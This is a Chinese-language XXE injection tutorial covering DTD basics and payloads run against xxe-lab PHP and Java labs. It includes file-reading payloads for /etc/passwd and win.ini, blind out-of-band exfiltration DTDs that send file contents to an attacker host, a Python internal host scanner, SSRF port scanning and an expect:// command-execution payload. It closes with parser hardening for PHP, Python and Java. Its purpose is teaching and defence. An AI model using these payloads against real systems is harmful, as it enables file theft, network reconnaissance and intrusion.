<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  //XML声明</span><br><span class="line">&lt;!DOCTYPE note [     //文档类型定义</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;         //文档元素</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h5 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h5><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<h5 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h5><p>内部声明：<!DOCTYPE 根元素 [元素声明] ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<p>外部声明：<!DOCTYPE 根元素 SYSTEM "文件名"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;http://127.0.0.1/note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br><span class="line"> </span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">#http://127.0.0.1/note.dtd的内容为</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h5 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h5><p>构成DTD的叫做DTD实体，包括内部实体和外部实体。</p>
<p>内部和外部实体中，又有一般实体和参数实体</p>
<ul>
<li>一般实体： 引用方式：&amp;实体名；</li>
<li>参数实体： 引用方式：%实体名；</li>
</ul>
<p>注意参数实体只能在DTD中申明，DTD中引用；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY normal    &quot;hello&quot;&gt;     &lt;!-- 内部一般实体 --&gt;</span><br><span class="line">    &lt;!ENTITY % normal2 &quot;hello&quot;&gt;     &lt;!-- 内部参数实体 --&gt;</span><br><span class="line">    &lt;!ENTITY normal3 SYSTEM &quot;http://xml.org/hhh.dtd&quot;&gt;    &lt;!-- 外部一般实体 --&gt;</span><br><span class="line">    &lt;!ENTITY % normal4 SYSTEM &quot;file:///1234.dtd&quot;&gt;        &lt;!-- 外部参数实体 --&gt;</span><br><span class="line">    %normal4;            &lt;!-- 引用参数实体 --&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;normal;&lt;/message&gt;    &lt;!-- 引用一般实体 --&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体还能嵌套定义，但需要注意的是，内层的定义的参数实体% 需要进行HTML实体编码，否则会出现解析错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % outside &#x27;&lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;&#x27;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&amp;files;&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XXE原理"><a href="#XXE原理" class="headerlink" title="XXE原理"></a>XXE原理</h2><p>XXE即XML外部实体注入 。和sql注入一样，进行xml修改成恶意代码后，xml解析器解析了恶意代码造成XXE。</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="方式一：-直接通过DTD外部实体声明"><a href="#方式一：-直接通过DTD外部实体声明" class="headerlink" title="方式一： 直接通过DTD外部实体声明"></a>方式一： 直接通过DTD外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;b;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="方式二：通过DTD文档引入外部DTD文档中的外部实体声明"><a href="#方式二：通过DTD文档引入外部DTD文档中的外部实体声明" class="headerlink" title="方式二：通过DTD文档引入外部DTD文档中的外部实体声明"></a>方式二：通过DTD文档引入外部DTD文档中的外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE Quan SYSTEM &quot;http://ip/eval.dtd&quot;&gt;</span><br><span class="line">		&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br><span class="line">#DTD文件内容：</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明"><a href="#方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明" class="headerlink" title="方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明"></a>方式三：通过DTD外部实体声明引入外部DTD文档中的外部实体声明</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Quan[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;http://ip/eval.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br><span class="line">#Quan.dtd的外部实体声明内容：</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XXE的分类"><a href="#XXE的分类" class="headerlink" title="XXE的分类"></a>XXE的分类</h3><p>XXE分成了三类，正常回显XXE、报错XXE和Blind XXE</p>
<h4 id="一、有回显XXE"><a href="#一、有回显XXE" class="headerlink" title="一、有回显XXE"></a>一、有回显XXE</h4><p>示例：1.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321181626275-495525002.png" alt="image-20220321181626389"></p>
<p>有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误，这时候就可以利用CDATA或者base64编码来绕过。</p>
<p>1.可以使用base64编码</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/system.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;file;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321181332551-263562990.png" alt="image-20220321181332580"></p>
<p>2.使用CDATA</p>
<p>CDATA的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"> </span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br><span class="line"> </span><br><span class="line">#evil.dtd</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321185953669-35570466.png" alt="image-20220321185953632"></p>
<h4 id="二、无回显XXE"><a href="#二、无回显XXE" class="headerlink" title="二、无回显XXE"></a>二、无回显XXE</h4><p>修改1.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://IP:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://IP/evil.dtd&quot;&gt; </span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321190947948-229616586.png" alt="image-20220321190948041"></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321191019583-524554951.png" alt="image-20220321191019504"></p>
<h3 id="XXE的挖掘思路"><a href="#XXE的挖掘思路" class="headerlink" title="XXE的挖掘思路"></a>XXE的挖掘思路</h3><p>检测xml是否被解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY dog &quot;this is dog&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;dog;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>检测是否支持外部实体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % dog SYSTEM &quot;http://ip:9999&quot;&gt;</span><br><span class="line">%dog;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h2 id="xxe-lab-php"><a href="#xxe-lab-php" class="headerlink" title="xxe-lab-php"></a>xxe-lab-php</h2><h3 id="有回显XXE利用"><a href="#有回显XXE利用" class="headerlink" title="有回显XXE利用"></a>有回显XXE利用</h3><p>在登陆点抓一个包</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321204955541-1286779273.png" alt="image-20220321204955573"></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;yang&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321205152255-555921104.png" alt="image-20220321205152237"></p>
<p>注意点必须要把获取的数据写入username标签，因为这里的输出是username标签的</p>
<h3 id="无回显XXE利用"><a href="#无回显XXE利用" class="headerlink" title="无回显XXE利用"></a>无回显XXE利用</h3><p>注释echo</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321205640958-468375062.png" alt="image-20220321205641054"></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.31.144/test.dtd&quot;&gt; </span><br><span class="line">%dtd;%int;%send; ]&gt;</span><br></pre></td></tr></table></figure>

<p>test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.144:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321210105270-1223906708.png" alt="image-20220321210104852"></p>
<h3 id="内网存活主机扫描"><a href="#内网存活主机扫描" class="headerlink" title="内网存活主机扫描"></a>内网存活主机扫描</h3><p>可以读取 &#x2F;etc&#x2F;network&#x2F;interfaces 或者 &#x2F;proc&#x2F;net&#x2F;arp 或者 &#x2F;etc&#x2F;host 文件，这样我们就能拿到网段了</p>
<p>利用python2脚本探测存活主机：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"> </span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;</span><br><span class="line">    x = requests.post(&#x27;http://192.168.12.130/xxe-lab/php_xxe/doLogin.php&#x27;, data=xml, headers=headers, timeout=5).text</span><br><span class="line">    coded_string = x.split(&#x27; &#x27;)[-2] </span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(129, 135):</span><br><span class="line">    try:</span><br><span class="line">        i = str(i)</span><br><span class="line">        #此处填写网段</span><br><span class="line">        ip = &#x27;192.168.12.&#x27; + i</span><br><span class="line">        string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>

<p>结果，可以看到130主机在线</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321211044738-609924708.png" alt="image-20220321211043569"></p>
<h3 id="HTTP端口扫描"><a href="#HTTP端口扫描" class="headerlink" title="HTTP端口扫描"></a>HTTP端口扫描</h3><p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;http://192.168.202.130:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;test;&lt;/login&gt;&lt;secret&gt;cc&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321211348356-1619415418.png" alt="image-20220321211348341"></p>
<p>后面放到Intruder中爆破即可，根据页面长度或响应时间</p>
<h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>payload，前提是要开启expect拓展</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE tets[</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;expect://执行的命令&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure>

<h2 id="xxe-lab-java"><a href="#xxe-lab-java" class="headerlink" title="xxe-lab-java"></a>xxe-lab-java</h2><p>搭建好之后，访问</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321213953926-1178940623.png" alt="image-20220321213953393"></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;CC&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321214418859-1781890276.png" alt="image-20220321214418897"></p>
<p>ssrf-payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;CC&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321214655764-112584513.png" alt="image-20220321214655641"></p>
<h2 id="XXE修复"><a href="#XXE修复" class="headerlink" title="XXE修复"></a>XXE修复</h2><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>
<p>使用正确的方法：</p>
<h3 id="代码层防范（PHP）"><a href="#代码层防范（PHP）" class="headerlink" title="代码层防范（PHP）"></a>代码层防范（PHP）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>

<h3 id="代码层防范（Python）"><a href="#代码层防范（Python）" class="headerlink" title="代码层防范（Python）"></a>代码层防范（Python）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<h3 id="代码层防范（Java）"><a href="#代码层防范（Java）" class="headerlink" title="代码层防范（Java）"></a>代码层防范（Java）</h3><p>使用 XML 库的 Java 应用程序特别容易受到 XXE  的攻击，因为大多数 Java XML 解析器的默认设置是启用 XXE。 要安全地使用这些解析器，您必须在您使用的解析器中显式禁用 XXE。 下面介绍如何在 Java 最常用的 XML 解析器中禁用 XXE。</p>
<p><strong>JAXP DocumentBuilderFactory、SAXParserFactory 和 DOM4J</strong></p>
<p><code>DocumentBuilderFactory,</code> <code>SAXParserFactory</code>和 <code>DOM4J</code> <code>XML</code>解析器可以使用相同的技术进行配置，以保护它们免受 XXE 的侵害。</p>
<p>只有 <code>DocumentBuilderFactory</code>此处提供了示例。JAXP <code>DocumentBuilderFactory</code> setFeature 方法允许开发人员控制启用或禁用哪些特定于实现的 XML 处理器功能。</p>
<p>这些功能既可以在工厂设置，也可以在底层设置 <code>XMLReader</code> setFeature 方法。</p>
<h4 id="DocumentBuilder"><a href="#DocumentBuilder" class="headerlink" title="DocumentBuilder"></a>DocumentBuilder</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">import javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">String FEATURE = null;</span><br><span class="line">try &#123;</span><br><span class="line">  FEATURE = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, true);</span><br><span class="line">  FEATURE = &quot;http://xml.org/sax/features/external-general-entities&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, false);</span><br><span class="line">  FEATURE = &quot;http://xml.org/sax/features/external-parameter-entities&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, false);</span><br><span class="line">  FEATURE = &quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;;</span><br><span class="line">  dbf.setFeature(FEATURE, false);</span><br><span class="line">  dbf.setXIncludeAware(false);</span><br><span class="line">  dbf.setExpandEntityReferences(false);</span><br><span class="line">  logger.info(&quot;ParserConfigurationException was thrown. The feature &#x27;&quot; + FEATURE</span><br><span class="line">  + &quot;&#x27; is probably not supported by your XML processor.&quot;);</span><br><span class="line">  ...</span><br><span class="line">&#125; catch (SAXException e) &#123;</span><br><span class="line">  logger.warning(&quot;A DOCTYPE was passed into the XML document&quot;);</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">  logger.error(&quot;IOException occurred, XXE may still possible: &quot; + e.getMessage());</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">DocumentBuilder safebuilder = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure>

<p>对于语法突出显示的示例代码片段，使用 <code>SAXParserFactory</code></p>
<h4 id="SAXParserFactory"><a href="#SAXParserFactory" class="headerlink" title="SAXParserFactory"></a>SAXParserFactory</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.xml.parsers.ParserConfigurationException;</span><br><span class="line">import javax.xml.parsers.SAXParser;</span><br><span class="line">import javax.xml.parsers.SAXParserFactory;</span><br><span class="line"></span><br><span class="line">import org.xml.sax.SAXNotRecognizedException;</span><br><span class="line">import org.xml.sax.SAXNotSupportedException;</span><br><span class="line">import org.xml.sax.XMLReader;</span><br><span class="line">  SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">  SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">  XMLReader reader = saxParser.getXMLReader();</span><br><span class="line">  try &#123;</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">  &#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">  &#125; catch (SAXNotRecognizedException e) &#123;</span><br><span class="line">  &#125; catch (SAXNotSupportedException e) &#123;</span><br><span class="line">  &#125; catch ... &#123;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>StAX 解析器，例如 <code>XMLInputFactory</code>允许设置各种属性和功能。保护 Java <code>XMLInputFactory</code>来自 XXE，请执行以下操作：</p>
<h4 id="xmlInputFactory"><a href="#xmlInputFactory" class="headerlink" title="xmlInputFactory"></a>xmlInputFactory</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);</span><br><span class="line">xmlInputFactory.setProperty(&quot;javax.xml.stream.isSupportingExternalEntities&quot;, false);</span><br></pre></td></tr></table></figure>

<p>Oracle DOM 解析器 ，遵循 Oracle 推荐， 例如：</p>
<h4 id="DOMParser"><a href="#DOMParser" class="headerlink" title="DOMParser"></a>DOMParser</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DOMParser domParser = new DOMParser();</span><br><span class="line">  domParser.setAttribute(DOMParser.EXPAND_ENTITYREF, false);</span><br><span class="line">  domParser.setAttribute(DOMParser.DTD_OBJECT, dtdObj);</span><br><span class="line">domParser.setAttribute(DOMParser.ENTITY_EXPANSION_DEPTH, 12);</span><br></pre></td></tr></table></figure>

<p>为了保护一个 <code>javax.xml.transform.TransformerFactory</code>来自 XXE，请执行以下操作：</p>
<h4 id="TransformerFactory"><a href="#TransformerFactory" class="headerlink" title="TransformerFactory"></a>TransformerFactory</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &quot;&quot;);</span><br></pre></td></tr></table></figure>

<p>为了保护一个 <code>javax.xml.validation.Validator</code>来自 XXE，请执行以下操作：</p>
<h4 id="validator"><a href="#validator" class="headerlink" title="validator"></a>validator</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);</span><br><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);</span><br></pre></td></tr></table></figure>

